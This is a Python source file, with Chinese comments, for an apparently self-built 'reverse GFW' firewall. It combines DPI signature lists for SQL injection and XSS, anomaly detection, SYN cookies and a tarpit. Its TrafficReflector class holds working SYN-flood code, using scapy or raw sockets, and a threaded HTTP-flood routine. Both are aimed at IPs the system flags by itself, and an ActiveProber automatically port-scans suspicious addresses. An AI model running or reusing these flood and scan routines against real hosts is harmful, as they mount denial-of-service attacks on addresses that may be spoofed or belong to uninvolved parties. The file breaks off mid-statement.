"""
HIDRS 自我保护系统（反向GFW）
Inverse Great Firewall for HIDRS Self-Defense

核心理念：
- GFW是用来阻止用户访问外部，HIDRS反向运用来阻止恶意访问内部
- 不仅防御攻击，还能将攻击流量反弹成武器
- 结合DPI、主动探测、流量分析和机器学习

技术架构：
┌─────────────────────────────────────────────────────────┐
│                    HIDRS 自我保护层                       │
├─────────────────────────────────────────────────────────┤
│  1. 流量监控层 (Traffic Monitor)                         │
│     - NFQueue包拦截                                      │
│     - DPI深度包检测                                      │
│     - 协议指纹识别                                        │
├─────────────────────────────────────────────────────────┤
│  2. 威胁检测层 (Threat Detection)                        │
│     - 主动探测可疑连接                                    │
│     - 行为模式分析（HLIG异常检测）                        │
│     - IP信誉评分系统                                      │
├─────────────────────────────────────────────────────────┤
│  3. 防御执行层 (Defense Execution)                       │
│     - SYN Cookies（防SYN Flood）                        │
│     - Tarpit（延迟响应）                                 │
│     - 连接限流                                           │
│     - 动态黑名单                                         │
├─────────────────────────────────────────────────────────┤
│  4. 反击层 (Counter-Attack)                             │
│     - DDoS流量反射                                       │
│     - Honeypot陷阱                                       │
│     - 攻击者画像追踪                                      │
│     - 情报共享网络                                        │
└─────────────────────────────────────────────────────────┘

参考文献：
- GFW DPI技术: https://gfw.report/publications/usenixsecurity23/en/
- 主动探测: https://blog.torproject.org/learning-more-about-gfws-active-probing-system/
- SYN Cookies: https://en.wikipedia.org/wiki/SYN_cookies
- Tarpit技术: https://www.secureworks.com/research/ddos
- OpenGFW实现: https://opengfw.io/
"""

import os
import time
import socket
import logging
import hashlib
import threading
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime, timedelta
from collections import defaultdict, deque
from dataclasses import dataclass

import numpy as np

logger = logging.getLogger(__name__)


@dataclass
class ThreatLevel:
    """威胁等级"""
    CLEAN = 0           # 清白
    SUSPICIOUS = 1      # 可疑
    MALICIOUS = 2       # 恶意
    CRITICAL = 3        # 严重威胁


@dataclass
class ConnectionProfile:
    """连接画像"""
    ip: str
    port: int
    first_seen: datetime
    last_seen: datetime
    packet_count: int
    byte_count: int
    protocol: str

    # 行为特征
    syn_count: int = 0
    incomplete_handshakes: int = 0
    suspicious_patterns: List[str] = None

    # 威胁评分
    threat_score: float = 0.0
    threat_level: int = ThreatLevel.CLEAN

    # HLIG分析
    fiedler_anomaly_score: float = 0.0

    def __post_init__(self):
        if self.suspicious_patterns is None:
            self.suspicious_patterns = []


class PacketAnalyzer:
    """
    包分析器
    基于GFW的DPI技术，对流量进行深度包检测
    """

    # 协议指纹库（基于GFW的特征库）
    PROTOCOL_SIGNATURES = {
        'tor': [
            b'\x16\x03\x01',  # TLS handshake
            b'GET / HTTP/1.0',  # Tor HTTP request
        ],
        'shadowsocks': [
            b'\x05',  # SOCKS5
        ],
        'vmess': [
            b'\x00\x00\x00',  # VMess header
        ],
        'http_flood': [
            b'GET /',
            b'POST /',
            b'HEAD /',
        ],
        'sql_injection': [
            b'UNION SELECT',
            b'OR 1=1',
            b"'; DROP TABLE",
        ],
        'xss_attack': [
            b'<script>',
            b'javascript:',
            b'onerror=',
        ]
    }

    def __init__(self):
        """初始化包分析器"""
        self.packet_cache = deque(maxlen=10000)
        self.signature_hits = defaultdict(int)

    def analyze_packet(self, packet_data: bytes, src_ip: str, dst_ip: str) -> Dict[str, Any]:
        """
        深度包检测

        返回:
        {
            'protocol': 'http/https/tor/shadowsocks',
            'suspicious': True/False,
            'matched_signatures': [...],
            'threat_indicators': [...]
        }
        """
        result = {
            'protocol': 'unknown',
            'suspicious': False,
            'matched_signatures': [],
            'threat_indicators': []
        }

        # 协议识别
        for protocol, signatures in self.PROTOCOL_SIGNATURES.items():
            for sig in signatures:
                if sig in packet_data:
                    result['matched_signatures'].append(protocol)
                    self.signature_hits[protocol] += 1

        # 威胁检测
        if 'sql_injection' in result['matched_signatures']:
            result['suspicious'] = True
            result['threat_indicators'].append('SQL injection attempt')

        if 'xss_attack' in result['matched_signatures']:
            result['suspicious'] = True
            result['threat_indicators'].append('XSS attack attempt')

        # HTTP Flood检测（高频率重复请求）
        if b'GET /' in packet_data or b'POST /' in packet_data:
            recent_packets = [p for p in self.packet_cache if p['src_ip'] == src_ip]
            if len(recent_packets) > 50:  # 50个包/秒
                result['suspicious'] = True
                result['threat_indicators'].append('Possible HTTP flood')

        # 缓存包信息
        self.packet_cache.append({
            'timestamp': time.time(),
            'src_ip': src_ip,
            'dst_ip': dst_ip,
            'size': len(packet_data)
        })

        return result


class ActiveProber:
    """
    主动探测器
    基于GFW的主动探测技术，主动探测可疑连接

    GFW工作原理：
    1. 被动监听发现可疑流量
    2. 主动发送探测包确认
    3. 如果服务器响应符合特征，立即加入黑名单

    HIDRS反向应用：
    1. 发现可疑连接
    2. 主动探测是否为扫描器/攻击工具
    3. 确认后拉黑或反击
    """

    def __init__(self):
        """初始化主动探测器"""
        self.probe_results = {}
        self.probe_timeout = 5.0

    def probe_suspicious_ip(self, ip: str, port: int) -> Dict[str, Any]:
        """
        主动探测可疑IP

        探测方法：
        1. 发送畸形包测试响应
        2. 尝试常见扫描器指纹
        3. 检测开放端口模式

        返回:
        {
            'is_scanner': True/False,
            'scanner_type': 'nmap/masscan/zmap',
            'open_ports': [...],
            'os_fingerprint': 'Linux/Windows'
        }
        """
        result = {
            'is_scanner': False,
            'scanner_type': None,
            'open_ports': [],
            'os_fingerprint': None,
            'probe_timestamp': datetime.utcnow()
        }

        try:
            # 探测1: 发送畸形SYN包
            # 正常客户端会重传，扫描器通常不会
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.probe_timeout)

            # 探测2: 检测响应时间
            # 自动化工具响应极快，人工浏览慢
            start = time.time()
            try:
                sock.connect((ip, port))
                response_time = time.time() - start

                if response_time < 0.01:  # 10ms内响应
                    result['is_scanner'] = True
                    result['scanner_type'] = 'automated_tool'
            except:
                pass
            finally:
                sock.close()

            # 探测3: 端口扫描检测
            # 尝试连接多个端口，扫描器会快速响应
            common_ports = [22, 80, 443, 3306, 6379, 27017, 9200]
            open_count = 0

            for p in common_ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    if s.connect_ex((ip, p)) == 0:
                        open_count += 1
                        result['open_ports'].append(p)
                    s.close()
                except:
                    pass

            # 如果多个端口都快速响应，很可能是扫描器
            if open_count > 3:
                result['is_scanner'] = True

            logger.info(f"[ActiveProber] 探测 {ip}:{port} - 扫描器: {result['is_scanner']}")

        except Exception as e:
            logger.error(f"[ActiveProber] 探测失败: {e}")

        self.probe_results[ip] = result
        return result

    def is_known_scanner(self, ip: str) -> bool:
        """检查是否为已知扫描器"""
        return ip in self.probe_results and self.probe_results[ip]['is_scanner']


class HLIGAnomalyDetector:
    """
    HLIG异常检测器
    使用拉普拉斯矩阵谱分析检测异常流量模式

    正常流量：在拉普拉斯空间中形成密集簇
    攻击流量：表现为离群点或异常模式
    """

    def __init__(self, window_size: int = 100):
        """
        初始化异常检测器

        参数:
        - window_size: 滑动窗口大小
        """
        self.window_size = window_size
        self.traffic_window = deque(maxlen=window_size)
        self.baseline_fiedler = None

    def add_traffic_sample(self, connection_profile: ConnectionProfile):
        """添加流量样本"""
        # 提取特征向量
        features = self._extract_features(connection_profile)

        self.traffic_window.append({
            'timestamp': time.time(),
            'ip': connection_profile.ip,
            'features': features,
            'profile': connection_profile
        })

    def _extract_features(self, profile: ConnectionProfile) -> np.ndarray:
        """
        提取连接特征

        特征：
        1. 包速率 (packets/sec)
        2. 字节速率 (bytes/sec)
        3. SYN比率
        4. 不完整握手比率
        5. 连接持续时间
        """
        duration = (profile.last_seen - profile.first_seen).total_seconds() or 1.0

        features = np.array([
            profile.packet_count / duration,  # 包速率
            profile.byte_count / duration,    # 字节速率
            profile.syn_count / max(profile.packet_count, 1),  # SYN比率
            profile.incomplete_handshakes / max(profile.packet_count, 1),  # 不完整握手
            duration,  # 持续时间
        ])

        return features

    def detect_anomaly(self, profile: ConnectionProfile) -> Tuple[bool, float]:
        """
        检测异常

        返回:
        - (is_anomaly, anomaly_score)
        """
        if len(self.traffic_window) < 10:
            return False, 0.0

        # 构建流量特征矩阵
        feature_matrix = np.array([
            sample['features'] for sample in self.traffic_window
        ])

        # 归一化
        mean = np.mean(feature_matrix, axis=0)
        std = np.std(feature_matrix, axis=0) + 1e-6
        normalized = (feature_matrix - mean) / std

        # 构建相似度矩阵（基于欧氏距离）
        n = len(normalized)
        W = np.zeros((n, n))

        for i in range(n):
            for j in range(i + 1, n):
                dist = np.linalg.norm(normalized[i] - normalized[j])
                similarity = np.exp(-dist)  # 高斯核
                W[i, j] = similarity
                W[j, i] = similarity

        # 计算拉普拉斯矩阵
        D = np.diag(np.sum(W, axis=1))
        L = D - W

        # 归一化拉普拉斯矩阵
        D_sqrt_inv = np.diag(1.0 / np.sqrt(np.diag(D) + 1e-6))
        L_norm = np.eye(n) - D_sqrt_inv @ W @ D_sqrt_inv

        # 计算特征值
        try:
            eigenvalues = np.linalg.eigvalsh(L_norm)
            fiedler_value = eigenvalues[1]  # 第二小特征值

            # 建立基线
            if self.baseline_fiedler is None:
                self.baseline_fiedler = fiedler_value
                return False, 0.0

            # 计算异常得分
            anomaly_score = abs(fiedler_value - self.baseline_fiedler) / (self.baseline_fiedler + 1e-6)

            # 更新基线（指数移动平均）
            alpha = 0.1
            self.baseline_fiedler = alpha * fiedler_value + (1 - alpha) * self.baseline_fiedler

            # 判断异常
            is_anomaly = anomaly_score > 2.0  # 阈值

            logger.debug(f"[HLIG] Fiedler: {fiedler_value:.4f}, Baseline: {self.baseline_fiedler:.4f}, Anomaly: {anomaly_score:.4f}")

            return is_anomaly, anomaly_score

        except Exception as e:
            logger.error(f"[HLIG] 异常检测失败: {e}")
            return False, 0.0


class IPReputationSystem:
    """
    IP信誉评分系统
    基于历史行为动态评分
    """

    def __init__(self):
        """初始化信誉系统"""
        self.reputation_db = {}  # ip -> score (0-100)
        self.blacklist = set()
        self.whitelist = set()

    def get_reputation(self, ip: str) -> int:
        """获取IP信誉分（0-100，越高越好）"""
        if ip in self.whitelist:
            return 100
        if ip in self.blacklist:
            return 0
        return self.reputation_db.get(ip, 50)  # 默认50分

    def update_reputation(self, ip: str, delta: int):
        """
        更新信誉分

        参数:
        - delta: 变化量（正数增加信誉，负数降低）
        """
        current = self.get_reputation(ip)
        new_score = max(0, min(100, current + delta))

        self.reputation_db[ip] = new_score

        # 自动加入黑名单
        if new_score == 0:
            self.blacklist.add(ip)
            logger.warning(f"[Reputation] IP {ip} 加入黑名单")

        # 自动移出黑名单
        if new_score > 20 and ip in self.blacklist:
            self.blacklist.remove(ip)
            logger.info(f"[Reputation] IP {ip} 移出黑名单")

    def report_malicious(self, ip: str, reason: str):
        """报告恶意行为"""
        logger.warning(f"[Reputation] 恶意行为: {ip} - {reason}")
        self.update_reputation(ip, -30)

    def report_suspicious(self, ip: str, reason: str):
        """报告可疑行为"""
        logger.info(f"[Reputation] 可疑行为: {ip} - {reason}")
        self.update_reputation(ip, -10)

    def report_clean(self, ip: str):
        """报告正常行为"""
        self.update_reputation(ip, +1)


class SYNCookieDefense:
    """
    SYN Cookie防御
    基于Linux内核的SYN Cookie机制，防止SYN Flood攻击

    原理：
    1. 不维护半开连接状态
    2. 在SYN-ACK的序列号中编码连接信息（时间戳+MSS+HMAC）
    3. 只有收到合法ACK才分配资源

    支持两种模式：
    - 纯计算模式：仅生成/验证cookie值（无需scapy）
    - 封包模式：构造真实SYN-ACK封包（需要scapy + root权限）

    参考: https://en.wikipedia.org/wiki/SYN_cookies
    """

    def __init__(self, secret_key: bytes = None, enable_packet_mode: bool = False):
        """
        初始化SYN Cookie防御

        参数:
        - secret_key: 密钥（用于HMAC）
        - enable_packet_mode: 启用封包模式（需要scapy）
        """
        import hmac as _hmac
        self._hmac = _hmac
        self.secret_key = secret_key or os.urandom(32)
        self.pending_cookies = {}  # 纯计算模式的兼容存储

        # 封包模式
        self.packet_mode = False
        self._crafter = None
        if enable_packet_mode:
            try:
                from .packet_capture import PacketCrafter
                self._crafter = PacketCrafter()
                self.packet_mode = True
                logger.info("[SYNCookie] 封包模式已启用")
            except ImportError as e:
                logger.warning(f"[SYNCookie] 封包模式不可用（{e}），使用纯计算模式")

    def generate_cookie(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int) -> int:
        """
        生成SYN Cookie

        Cookie编码到TCP序列号的32位中：
        - 高5位: 时间戳（32秒循环，防重放）
        - 中3位: MSS编码
        - 低24位: HMAC签名截断
        """
        timestamp = int(time.time()) & 0x1F  # 5位时间戳

        data = f"{src_ip}:{src_port}:{dst_ip}:{dst_port}:{timestamp}".encode()
        signature = self._hmac.new(self.secret_key, data, hashlib.sha256).digest()

        sig_24 = int.from_bytes(signature[:3], 'big')
        mss_index = 2  # MSS编码（对应1460字节）
        cookie = (timestamp << 27) | (mss_index << 24) | sig_24

        return cookie

    def verify_cookie(self, ack_num: int, src_ip: str, src_port: int,
                      dst_ip: str, dst_port: int) -> bool:
        """
        无状态验证SYN Cookie

        从ACK的ack_num中提取cookie（ack_num = 服务端seq + 1），
        重新计算HMAC验证合法性。允许±1个时间戳周期的误差。
        """
        cookie = (ack_num - 1) & 0xFFFFFFFF
        recv_timestamp = (cookie >> 27) & 0x1F
        recv_sig = cookie & 0xFFFFFF

        now_ts = int(time.time()) & 0x1F
        valid_timestamps = [now_ts, (now_ts - 1) & 0x1F]

        for ts in valid_timestamps:
            data = f"{src_ip}:{src_port}:{dst_ip}:{dst_port}:{ts}".encode()
            signature = self._hmac.new(self.secret_key, data, hashlib.sha256).digest()
            expected_sig = int.from_bytes(signature[:3], 'big')

            if recv_sig == expected_sig and recv_timestamp == ts:
                return True

        return False

    def handle_syn(self, src_ip: str, src_port: int, dst_ip: str,
                   dst_port: int, client_seq: int) -> Optional[bytes]:
        """
        处理SYN封包：生成cookie并构造SYN-ACK

        封包模式返回SYN-ACK原始字节，纯计算模式返回None
        """
        cookie = self.generate_cookie(src_ip, src_port, dst_ip, dst_port)

        if self.packet_mode and self._crafter:
            syn_ack = self._crafter.craft_syn_ack(
                src_ip=dst_ip, dst_ip=src_ip,
                src_port=dst_port, dst_port=src_port,
                seq_num=cookie, ack_num=client_seq + 1,
                window=65535,
            )
            logger.debug(f"[SYNCookie] SYN-ACK -> {src_ip}:{src_port} cookie=0x{cookie:08x}")
            return syn_ack

        # 纯计算模式：存储cookie供旧接口验证
        cookie_key = (src_ip, src_port, dst_ip, dst_port)
        self.pending_cookies[cookie_key] = {
            'cookie': cookie,
            'timestamp': time.time()
        }
        return None

    def handle_ack(self, src_ip: str, src_port: int, dst_ip: str,
                   dst_port: int, ack_num: int) -> bool:
        """处理ACK封包：无状态验证SYN Cookie"""
        return self.verify_cookie(ack_num, src_ip, src_port, dst_ip, dst_port)

    def cleanup_expired(self):
        """清理过期cookie（纯计算模式兼容）"""
        now = time.time()
        expired = [
            key for key, val in self.pending_cookies.items()
            if now - val['timestamp'] > 60
        ]
        for key in expired:
            del self.pending_cookies[key]


class TarpitDefense:
    """
    Tarpit防御
    通过TCP窗口操控耗尽攻击者资源

    原理（真实网络层）：
    1. 接受TCP连接（完成三次握手）
    2. 将TCP窗口设为极小值（1字节），迫使对方每次只发1字节
    3. 周期性发送零窗口探测，保持连接不超时
    4. 攻击者被迫维持大量慢连接，消耗自身socket/内存资源

    回退模式（无scapy）：
    - 使用time.sleep()延迟响应（应用层tarpit）

    参考: https://www.secureworks.com/research/ddos
    """

    def __init__(self, window_size: int = 1, delay_seconds: float = 30.0,
                 enable_packet_mode: bool = False):
        """
        初始化Tarpit防御

        参数:
        - window_size: TCP窗口大小（封包模式，默认1字节）
        - delay_seconds: 延迟秒数（回退模式）
        - enable_packet_mode: 启用封包模式
        """
        self.window_size = window_size
        self.delay_seconds = delay_seconds
        self.tarpitted_ips = set()
        # 跟踪被tarpit的连接状态
        self.tarpitted_connections = {}

        # 封包模式
        self.packet_mode = False
        self._crafter = None
        if enable_packet_mode:
            try:
                from .packet_capture import PacketCrafter
                self._crafter = PacketCrafter()
                self.packet_mode = True
                logger.info(f"[Tarpit] 封包模式已启用 (窗口={window_size}字节)")
            except ImportError as e:
                logger.warning(f"[Tarpit] 封包模式不可用（{e}），使用延迟回退模式")

    def add_to_tarpit(self, ip: str):
        """将IP加入tarpit"""
        self.tarpitted_ips.add(ip)
        logger.info(f"[Tarpit] IP {ip} 加入tarpit"
                     f" ({'窗口=' + str(self.window_size) + 'B' if self.packet_mode else '延迟=' + str(self.delay_seconds) + 's'})")

    def should_tarpit(self, ip: str) -> bool:
        """检查是否应该tarpit"""
        return ip in self.tarpitted_ips

    def craft_tarpit_response(self, src_ip: str, dst_ip: str, src_port: int,
                               dst_port: int, seq_num: int, ack_num: int) -> Optional[bytes]:
        """
        构造tarpit ACK响应（极小TCP窗口）

        返回原始封包字节，调用方负责发送。
        非封包模式返回None。
        """
        if not self.packet_mode or not self._crafter:
            return None

        pkt_bytes = self._crafter.craft_tarpit_ack(
            src_ip=src_ip, dst_ip=dst_ip,
            src_port=src_port, dst_port=dst_port,
            seq_num=seq_num, ack_num=ack_num,
            window=self.window_size,
        )

        # 记录连接状态
        conn_key = (dst_ip, dst_port, src_ip, src_port)
        self.tarpitted_connections[conn_key] = {
            'start_time': time.time(),
            'last_ack_time': time.time(),
            'seq': seq_num,
            'ack': ack_num,
        }

        logger.debug(f"[Tarpit] 小窗口ACK -> {dst_ip}:{dst_port} (window={self.window_size})")
        return pkt_bytes

    def apply_delay(self, ip: str):
        """应用延迟（回退模式，应用层tarpit）"""
        if self.should_tarpit(ip):
            if self.packet_mode:
                # 封包模式下不使用sleep，由craft_tarpit_response处理
                return
            logger.debug(f"[Tarpit] 延迟响应 {ip} ({self.delay_seconds}s)")
            time.sleep(self.delay_seconds)

    def remove_from_tarpit(self, ip: str):
        """将IP从tarpit中移除"""
        self.tarpitted_ips.discard(ip)
        # 清理该IP的连接跟踪
        expired_keys = [k for k in self.tarpitted_connections if k[0] == ip]
        for k in expired_keys:
            del self.tarpitted_connections[k]

    def cleanup_stale_connections(self, max_age: float = 600.0):
        """清理超时的tarpit连接（默认10分钟）"""
        now = time.time()
        expired = [
            k for k, v in self.tarpitted_connections.items()
            if now - v['start_time'] > max_age
        ]
        for k in expired:
            del self.tarpitted_connections[k]


class TrafficReflector:
    """
    流量反射器
    将DDoS攻击流量反弹回攻击者

    警告：这是攻击性技术，仅用于授权安全测试和合法防御！

    使用scapy构造并发送反射封包：
    - SYN反射：向攻击者IP发送大量SYN包，消耗其连接表
    - RST反射：向攻击者发送RST包，中断其连接
    - HTTP反射：向攻击者IP发送HTTP请求（需要攻击者运行HTTP服务）

    参考: https://www.netscout.com/what-is-ddos/what-is-reflection-amplification-attack
    """

    def __init__(self, enable_reflection: bool = False):
        """
        初始化流量反射器

        参数:
        - enable_reflection: 是否启用反射（默认禁用，需明确启用）
        """
        self.enable_reflection = enable_reflection
        self.reflection_log = []
        self._crafter = None

        if enable_reflection:
            try:
                from .packet_capture import PacketCrafter
                self._crafter = PacketCrafter()
                logger.warning("[TrafficReflector] 流量反射已启用（scapy封包模式）")
            except ImportError:
                logger.warning("[TrafficReflector] scapy不可用，流量反射将使用socket回退")

    def reflect_attack(self, attacker_ip: str, attack_type: str, packet_count: int):
        """
        反射攻击

        警告：这会向攻击者发送流量！仅在确认合法防御的情况下使用！
        """
        if not self.enable_reflection:
            logger.warning("[TrafficReflector] 反射被禁用，跳过")
            return

        logger.warning(f"[TrafficReflector] 向 {attacker_ip} 反射 {attack_type} 攻击（{packet_count}包）")

        self.reflection_log.append({
            'timestamp': datetime.utcnow(),
            'target': attacker_ip,
            'type': attack_type,
            'packet_count': packet_count
        })

        if attack_type == 'syn_flood':
            self._reflect_syn_flood(attacker_ip, packet_count)
        elif attack_type == 'http_flood':
            self._reflect_http_flood(attacker_ip, packet_count)
        else:
            logger.warning(f"[TrafficReflector] 不支持的攻击类型: {attack_type}")

    def _reflect_syn_flood(self, target_ip: str, count: int):
        """
        SYN反射：向攻击者发送SYN包，消耗其连接表资源

        使用scapy构造原始SYN封包，随机源端口，目标为攻击者IP的常用端口。
        """
        import random

        if self._crafter:
            # scapy封包模式
            try:
                from scapy.all import IP, TCP, send
                target_ports = [80, 443, 8080, 22, 21, 25, 53]
                pkts = []
                for _ in range(count):
                    src_port = random.randint(1024, 65535)
                    dst_port = random.choice(target_ports)
                    pkt = IP(dst=target_ip) / TCP(
                        sport=src_port, dport=dst_port,
                        flags='S', seq=random.randint(0, 2**32 - 1)
                    )
                    pkts.append(pkt)

                # 批量发送（scapy支持列表发送）
                send(pkts, verbose=False)
                logger.info(f"[TrafficReflector] SYN反射完成: {count}包 -> {target_ip}")
            except Exception as e:
                logger.error(f"[TrafficReflector] SYN反射失败: {e}")
        else:
            # socket回退模式：使用原始socket发送SYN
            self._reflect_syn_via_socket(target_ip, count)

    def _reflect_syn_via_socket(self, target_ip: str, count: int):
        """使用原始socket发送SYN包（不依赖scapy的回退方案）"""
        import random
        import struct

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            for _ in range(count):
                src_port = random.randint(1024, 65535)
                dst_port = random.choice([80, 443, 8080])

                # TCP头部（SYN标志=0x02）
                tcp_header = struct.pack('!HHIIBBHHH',
                    src_port,           # 源端口
                    dst_port,           # 目标端口
                    random.randint(0, 2**32 - 1),  # 序列号
                    0,                  # 确认号
                    (5 << 4),           # 数据偏移（5个32位字）
                    0x02,               # 标志（SYN）
                    65535,              # 窗口大小
                    0,                  # 校验和（内核会填充）
                    0,                  # 紧急指针
                )

                s.sendto(tcp_header, (target_ip, dst_port))

            s.close()
            logger.info(f"[TrafficReflector] SYN反射完成（socket模式）: {count}包 -> {target_ip}")
        except PermissionError:
            logger.error("[TrafficReflector] SYN反射需要root权限")
        except Exception as e:
            logger.error(f"[TrafficReflector] SYN反射失败: {e}")

    def _reflect_http_flood(self, target_ip: str, count: int):
        """
        HTTP反射：向攻击者IP发送HTTP请求

        如果攻击者运行着HTTP服务，大量请求会消耗其服务器资源。
        使用socket直连而非requests库，避免连接池限制。
        """
        import concurrent.futures

        def _send_http_request(ip: str, port: int):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                # 发送HTTP GET请求
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                ).encode()
                s.sendall(request)
                s.close()
                return True
            except Exception:
                return False

        # 并发发送HTTP请求
        completed = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(count, 50)) as executor:
            futures = [
                executor.submit(_send_http_request, target_ip, 80)
                for _ in range(count)
            ]
            for f in concurrent.futures.as_completed(futures):
                if f.result():
                    completed += 1

        logger.info(f"[TrafficReflector] HTTP反射完成: {completed}/{count}请求 -> {target_ip}")


class HIDRSFirewall:
    """
    HIDRS反向防火墙
    整合所有自我保护机制

    支持三种运行模式：
    1. 正式模式 (live): 完整防御功能
    2. 模拟模式 (simulation): 只记录日志，不实际执行防御动作
    3. 测试模式 (test): 小范围测试，仅对白名单IP执行防御
    """

    def __init__(
        self,
        enable_active_probing: bool = True,
        enable_hlig_detection: bool = True,
        enable_syn_cookies: bool = True,
        enable_tarpit: bool = True,
        enable_traffic_reflection: bool = False,  # 默认禁用攻击性功能
        enable_attack_memory: bool = True,  # 启用攻击记忆系统
        enable_fast_filters: bool = True,  # 启用快速过滤清单
        enable_packet_capture: bool = False,  # 启用真实封包捕获（需要NFQueue+scapy+root）
        nfqueue_num: int = 0,  # NFQueue队列编号
        enable_easytier: bool = False,  # 启用EasyTier Mesh VPN
        easytier_config: Dict[str, Any] = None,  # EasyTier配置
        enable_openwrt: bool = False,  # 启用OpenWrt路由器集群管理
        openwrt_routers: List[Dict[str, Any]] = None,  # OpenWrt路由器列表
        simulation_mode: bool = False,  # 模拟模式
        test_mode: bool = False,  # 测试模式
        test_whitelist_ips: List[str] = None,  # 测试白名单IP
        max_test_clients: int = 10  # 最大测试客户端数
    ):
        """
        初始化HIDRS防火墙

        参数:
        - enable_active_probing: 启用主动探测
        - enable_hlig_detection: 启用HLIG异常检测
        - enable_syn_cookies: 启用SYN Cookie
        - enable_tarpit: 启用Tarpit
        - enable_traffic_reflection: 启用流量反射（⚠️ 攻击性功能）
        - enable_attack_memory: 启用攻击记忆系统
        - enable_fast_filters: 启用快速过滤清单（Spamhaus+邮件安全）
        - simulation_mode: 模拟模式（不实际执行防御）
        - test_mode: 测试模式（小范围测试）
        - test_whitelist_ips: IP白名单（测试模式用）
        - max_test_clients: 最大测试客户端数
        """
        logger.info("=" * 60)
        logger.info("🛡️  HIDRS反向防火墙初始化")
        logger.info("=" * 60)

        # 模式配置
        self.simulation_mode = simulation_mode
        self.test_mode = test_mode
        self.test_whitelist_ips = test_whitelist_ips or []
        self.max_test_clients = max_test_clients

        # 封包捕获模式（live模式下启用真实网络封包处理）
        self.enable_packet_capture = enable_packet_capture and not simulation_mode
        self.nfqueue_num = nfqueue_num
        self._packet_capture = None  # 延迟初始化，在start()中创建

        # 判断是否启用封包模式（传递给SYNCookie和Tarpit）
        _pkt_mode = self.enable_packet_capture

        # 组件初始化
        self.packet_analyzer = PacketAnalyzer()
        self.active_prober = ActiveProber() if enable_active_probing else None
        self.hlig_detector = HLIGAnomalyDetector() if enable_hlig_detection else None
        self.reputation_system = IPReputationSystem()
        self.syn_cookie = SYNCookieDefense(enable_packet_mode=_pkt_mode) if enable_syn_cookies else None
        self.tarpit = TarpitDefense(enable_packet_mode=_pkt_mode) if enable_tarpit else None
        self.reflector = TrafficReflector(enable_reflection=enable_traffic_reflection)

        # 攻击记忆系统（SOSA增强版）
        self.attack_memory = None
        self._attack_memory_sosa = False  # 初始化标志
        if enable_attack_memory:
            try:
                from .attack_memory import AttackMemoryWithSOSA
                self.attack_memory = AttackMemoryWithSOSA(
                    simulation_mode=simulation_mode,
                    test_mode=test_mode,
                    test_whitelist_ips=test_whitelist_ips,
                    max_test_clients=max_test_clients,
                    sosa_states=6,
                    sosa_groups=10,
                    sosa_window=30.0
                )
                self._attack_memory_sosa = True
            except Exception:
                from .attack_memory import AttackMemorySystem
                self.attack_memory = AttackMemorySystem(
                    simulation_mode=simulation_mode,
                    test_mode=test_mode,
                    test_whitelist_ips=test_whitelist_ips,
                    max_test_clients=max_test_clients
                )
                self._attack_memory_sosa = False

        # 智能资源调度器（ET-WCN降温算法）
        self.resource_scheduler = None
        try:
            from .smart_resource_scheduler import SmartResourceScheduler

            # 如果攻击记忆启用了SOSA和特征库，则传递给调度器
            sig_db = None
            if self._attack_memory_sosa and hasattr(self.attack_memory, 'signature_db'):
                sig_db = self.attack_memory.signature_db

            self.resource_scheduler = SmartResourceScheduler(
                T_max=1.0,
                T_min=0.01,
                delta_crit=3.0,
                window_size=60.0,
                signature_db=sig_db  # 传递特征库
            )
            self._scheduler_enabled = True
        except Exception as e:
            logger.warning(f"[HIDRSFirewall] 资源调度器初始化失败: {e}")
            self.resource_scheduler = None
            self._scheduler_enabled = False

        # 快速过滤清单系统（Spamhaus + 邮件安全 + 灰名单）
        self.filter_lists = None
        self._filter_lists_enabled = False
        if enable_fast_filters:
            try:
                from .fast_filter_lists import FastFilterLists
                self.filter_lists = FastFilterLists()
                self._filter_lists_enabled = True
                logger.info(f"✅ 快速过滤清单已启用")
                if self.filter_lists.spamhaus_enabled:
                    logger.info(f"  - Spamhaus DNSBL: 已集成")
            except Exception as e:
                logger.warning(f"[HIDRSFirewall] 快速过滤清单初始化失败: {e}")
                self.filter_lists = None
                self._filter_lists_enabled = False

        # EasyTier Mesh VPN 管理
        self.easytier_manager = None
        self._easytier_enabled = False
        if enable_easytier and not simulation_mode:
            try:
                from .easytier_manager import EasyTierManager
                et_config = easytier_config or {}
                self.easytier_manager = EasyTierManager(
                    network_name=et_config.get('network_name', 'hidrs-aegis'),
                    network_secret=et_config.get('network_secret', ''),
                    ipv4=et_config.get('ipv4', ''),
                    listeners=et_config.get('listeners', []),
                    peers=et_config.get('peers', []),
                    proxy_networks=et_config.get('proxy_networks', []),
                    core_path=et_config.get('core_path'),
                    cli_path=et_config.get('cli_path'),
                    rpc_portal=et_config.get('rpc_portal', '127.0.0.1:15888'),
                    config_file=et_config.get('config_file'),
                )

                # 注册拓扑变化回调：新节点上线时记录日志
                self.easytier_manager.on_topology_change(self._on_mesh_topology_change)
                self._easytier_enabled = True
            except Exception as e:
                logger.warning(f"[HIDRSFirewall] EasyTier初始化失败: {e}")

        # OpenWrt 路由器集群管理
        self.openwrt_fleet = None
        self._openwrt_enabled = False
        if enable_openwrt and not simulation_mode:
            try:
                from .openwrt_controller import OpenWrtFleetManager, RouterInfo
                self.openwrt_fleet = OpenWrtFleetManager()

                # 注册路由器
                for router_cfg in (openwrt_routers or []):
                    self.openwrt_fleet.add_router(RouterInfo(
                        host=router_cfg['host'],
                        port=router_cfg.get('port', 80),
                        username=router_cfg.get('username', 'root'),
                        password=router_cfg.get('password', ''),
                        use_https=router_cfg.get('use_https', False),
                        alias=router_cfg.get('alias', ''),
                        region=router_cfg.get('region', ''),
                    ))

                self._openwrt_enabled = True
            except Exception as e:
                logger.warning(f"[HIDRSFirewall] OpenWrt集群初始化失败: {e}")

        # 连接追踪
        self.connections = {}  # ip -> ConnectionProfile

        # 统计
        self.stats = {
            'total_packets': 0,
            'blocked_packets': 0,
            'suspicious_packets': 0,
            'tarpitted_connections': 0,
            'reflected_attacks': 0,
            'active_probes': 0,
